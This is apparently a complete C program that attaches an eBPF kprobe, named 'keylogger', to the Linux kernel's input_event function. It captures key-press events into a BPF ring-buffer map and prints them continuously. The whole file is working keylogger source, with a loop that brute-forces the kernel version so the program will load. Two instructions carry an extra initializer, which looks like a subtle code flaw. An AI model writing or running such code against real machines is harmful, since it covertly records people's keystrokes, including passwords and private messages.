#include <inttypes.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/perf_event.h>
#include <linux/version.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <syscall.h>
#include <unistd.h>

const int RING_SIZE = 31;

int create_map();
int create_program();
int create_perf_event();
int open_kprobe();
void attach_program(int progFd, int perfFd);
int pop_ring(int mapFd, int* type, int* code, int* value);
void read_map(int mapFd, int idx, int* type, int* code, int* value);
void write_map(int mapFd, int idx, int type, int code, int value);

int main() {
  int mapFd = create_map();
  int progFd = create_program(mapFd);
  int perfFd = create_perf_event();
  attach_program(progFd, perfFd);
  while (1) {
    int type;
    int code;
    int value;
    while (pop_ring(mapFd, &type, &code, &value)) {
      printf("type=%d code=%d value=%d\n", type, code, value);
    }
    usleep(100000);
  }
  return 0;
}

int create_map() {
  union bpf_attr bpf_args;
  bzero(&bpf_args, sizeof(bpf_args));
  bpf_args.map_type = BPF_MAP_TYPE_HASH;
  bpf_args.key_size = 4;
  bpf_args.value_size = 12;
  bpf_args.max_entries = RING_SIZE + 1;

  int mapFd = syscall(__NR_bpf, BPF_MAP_CREATE, &bpf_args, sizeof(bpf_args));
  if (mapFd < 0) {
    perror("create map");
    exit(1);
  }

  write_map(mapFd, RING_SIZE, 0, 0, 0);

  return mapFd;
}

int create_program(int mapFd) {
  struct bpf_insn program[] = {
      // Copy RSI, RDX, RCX into the stack at FP[-16].
      {BPF_LDX | BPF_MEM | BPF_W, 2, 1, 13 * 8, 0},
      {BPF_STX | BPF_MEM | BPF_W, 10, 2, -16, 0},
      {BPF_LDX | BPF_MEM | BPF_W, 2, 1, 12 * 8, 0},
      {BPF_STX | BPF_MEM | BPF_W, 10, 2, -12, 0},
      {BPF_LDX | BPF_MEM | BPF_W, 2, 1, 11 * 8, 0},
      {BPF_STX | BPF_MEM | BPF_W, 10, 2, -8, 0},

      // Load the event type into R0.
      {BPF_LDX | BPF_MEM | BPF_W, 0, 1, 13 * 8, 0},
      // Only look at key events (type == 1).
      {BPF_JMP | BPF_JEQ | BPF_K, 0, 0, 2, 1},
      // Exit with a zero status.
      {BPF_ALU | BPF_MOV | BPF_K, 0, 0, 0, 0},
      {BPF_JMP | BPF_EXIT, 0, 0, 0, 0},

      // Load the map file descriptor into R1.
      {BPF_LD | BPF_DW | BPF_IMM, 1, BPF_PSEUDO_MAP_FD, 0, mapFd},
      {0, 0, 0, 0, 0},
      // Load FP[-4] into R2.
      {BPF_ALU64 | BPF_MOV | BPF_X, 2, 10, 0, 0},
      {BPF_ALU64 | BPF_ADD | BPF_K, 2, 0, 0, -4},
      // Store the key into FP[-4].
      {BPF_ST | BPF_MEM | BPF_W, 10, 0, -4, RING_SIZE},
      // Lookup the metadata key.
      {BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem},

      // Exit if NULL.
      {BPF_JMP | BPF_JNE | BPF_K, 0, 0, 2, 0},
      // Exit with a zero status.
      {BPF_ALU | BPF_MOV | BPF_K, 0, 0, 0, 0},
      {BPF_JMP | BPF_EXIT, 0, 0, 0, 0},
      // Load start index into R1.
      {BPF_LDX | BPF_MEM | BPF_W, 1, 0, 0, 0},
      // Put the start index into FP[-28].
      {BPF_STX | BPF_MEM | BPF_W, 10, 1, -28, 0},
      // Load end index into R1.
      {BPF_LDX | BPF_MEM | BPF_W, 1, 0, 4, 0},
      // Put the end index into FP[-24].
      {BPF_STX | BPF_MEM | BPF_W, 10, 1, -24, 0},
      // Put zero into FP[-20].
      {BPF_ST | BPF_MEM | BPF_W, 10, 0, -20, 0},

      // Load the map file descriptor into R1.
      {BPF_LD | BPF_DW | BPF_IMM, 1, BPF_PSEUDO_MAP_FD, 0, mapFd},
      {0, 0, 0, 0, 0},
      // Put FP[-24] into R2.
      {BPF_ALU64 | BPF_MOV | BPF_X, 2, 10, 0, 0},
      {BPF_ALU64 | BPF_ADD | BPF_K, 2, 0, 0, -24},
      // Put FP[-16] into R3.
      {BPF_ALU64 | BPF_MOV | BPF_X, 3, 10, 0, 0},
      {BPF_ALU64 | BPF_ADD | BPF_K, 3, 0, 0, -16},
      // Set the BPF_ANY flag.
      {BPF_ALU | BPF_MOV | BPF_K, 4, 0, 0, 0, BPF_ANY},
      // Set the current map value.
      {BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem},

      // Load end index into R1.
      {BPF_LDX | BPF_MEM | BPF_W, 1, 10, -24, 0},
      // Increment the end index.
      {BPF_ALU | BPF_ADD | BPF_K, 1, 0, 0, 1},
      // Wrap around the end index.
      {BPF_ALU | BPF_MOD | BPF_K, 1, 0, 0, RING_SIZE},
      // Put the end index into FP[-24].
      {BPF_STX | BPF_MEM | BPF_W, 10, 1, -24, 0},

      // Load the map file descriptor into R1.
      {BPF_LD | BPF_DW | BPF_IMM, 1, BPF_PSEUDO_MAP_FD, 0, mapFd},
      {0, 0, 0, 0, 0},
      // Store the key into FP[-4].
      {BPF_ST | BPF_MEM | BPF_W, 10, 0, -4, RING_SIZE},
      // Put FP[-4] in R2.
      {BPF_ALU64 | BPF_MOV | BPF_X, 2, 10, 0, 0},
      {BPF_ALU64 | BPF_ADD | BPF_K, 2, 0, 0, -4},
      // Load FP[-28] into R3.
      {BPF_ALU64 | BPF_MOV | BPF_X, 3, 10, 0, 0},
      {BPF_ALU64 | BPF_ADD | BPF_K, 3, 0, 0, -28},
      // Set the BPF_ANY flag.
      {BPF_ALU | BPF_MOV | BPF_K, 4, 0, 0, 0, BPF_ANY},
      // Set the current map value.
      {BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_update_elem},

      // Terminate the program.
      {BPF_ALU | BPF_MOV | BPF_K, 0, 0, 0, 0},
      {BPF_JMP | BPF_EXIT, 0, 0, 0, 0},
  };

  char* logBuffer = (char*)malloc(0x10000);
  bzero(logBuffer, 0x10000);
  union bpf_attr bpf_args;
  bzero(&bpf_args, sizeof(bpf_args));
  bpf_args.prog_type = BPF_PROG_TYPE_KPROBE;
  bpf_args.insns = (uint64_t)program;
  bpf_args.insn_cnt = sizeof(program) / sizeof(struct bpf_insn);
  bpf_args.license = (uint64_t) "GPL";
  bpf_args.log_level = 1;
  bpf_args.log_size = 0x10000;
  bpf_args.log_buf = (uint64_t)logBuffer;
  bpf_args.kern_version = LINUX_VERSION_CODE;

  int filter = syscall(__NR_bpf, BPF_PROG_LOAD, &bpf_args, sizeof(bpf_args));
  if (filter >= 0) {
    return filter;
  }

  // Brute force the kernel version number.
  for (int i = 0; i < 255; ++i) {
    for (int j = 0; j < 255; ++j) {
      bpf_args.kern_version = KERNEL_VERSION(LINUX_VERSION_CODE >> 16, i, j);
      int filter =
          syscall(__NR_bpf, BPF_PROG_LOAD, &bpf_args, sizeof(bpf_args));
      if (filter >= 0) {
        return filter;
      }
    }
  }

  perror("load program");
  fprintf(stderr, "%s\n", logBuffer);
  exit(1);
}

int create_perf_event() {
  // Re-use an existing kprobe if possible.
  int res = open_kprobe();
  if (res >= 0) {
    return res;
  }

  FILE* fp = fopen("/sys/kernel/debug/tracing/kprobe_events", "wab");
  if (!fp) {
    perror("fopen");
    exit(1);
  }
  if (fprintf(fp, "p:kprobes/keylogger input_event") < 0) {
    goto fail;
  }
  if (fflush(fp)) {
    goto fail;
  }
  fclose(fp);

  res = open_kprobe();
  if (res < 0) {
    perror("open_kprobe");
    exit(1);
  }

  return res;

fail:
  perror("create_perf_event");
  fclose(fp);
  exit(1);
}

int open_kprobe() {
  FILE* fp =
      fopen("/sys/kernel/debug/tracing/events/kprobes/keylogger/id", "rb");
  if (!fp) {
    return -1;
  }
  char config[512];
  fread(config, sizeof(config), 1, fp);
  fclose(fp);

  struct perf_event_attr attr;
  bzero(&attr, sizeof(attr));
  attr.config = strtol(config, NULL, 0);
  attr.type = PERF_TYPE_TRACEPOINT;
  attr.sample_period = 1;
  attr.wakeup_events = 1;
  return syscall(__NR_perf_event_open, &attr, -1, 0, -1, PERF_FLAG_FD_CLOEXEC);
}

void attach_program(int progFd, int perfFd) {
  if (ioctl(perfFd, PERF_EVENT_IOC_SET_BPF, progFd) < 0) {
    perror("attach BPF");
    exit(1);
  }
  if (ioctl(perfFd, PERF_EVENT_IOC_ENABLE, 0) < 0) {
    perror("enable event");
    exit(1);
  }
}

int pop_ring(int mapFd, int* type, int* code, int* value) {
  int start;
  int end;
  int unused;
  read_map(mapFd, RING_SIZE, &start, &end, NULL);
  if (start == end) {
    return 0;
  }
  write_map(mapFd, RING_SIZE, (start + 1) % RING_SIZE, end, 0);
  read_map(mapFd, start, type, code, value);
  return 1;
}

void read_map(int mapFd, int idx, int* type, int* code, int* value) {
  int32_t buf[3] = {0, 0, 0};
  union bpf_attr bpf_args;
  bzero(&bpf_args, sizeof(bpf_args));
  uint32_t key = idx;
  bpf_args.map_fd = mapFd;
  bpf_args.key = (uint64_t)&key;
  bpf_args.value = (uint64_t)buf;
  syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &bpf_args, sizeof(bpf_args));
  if (type) {
    *type = buf[0];
  }
  if (code) {
    *code = buf[1];
  }
  if (value) {
    *value = buf[2];
  }
}

void write_map(int mapFd, int idx, int type, int code, int value) {
  int32_t buf[3] = {type, code, value};
  union bpf_attr bpf_args;
  bzero(&bpf_args, sizeof(bpf_args));
  uint32_t key = idx;
  bpf_args.map_fd = mapFd;
  bpf_args.key = (uint64_t)&key;
  bpf_args.value = (uint64_t)buf;
  syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &bpf_args, sizeof(bpf_args));
}
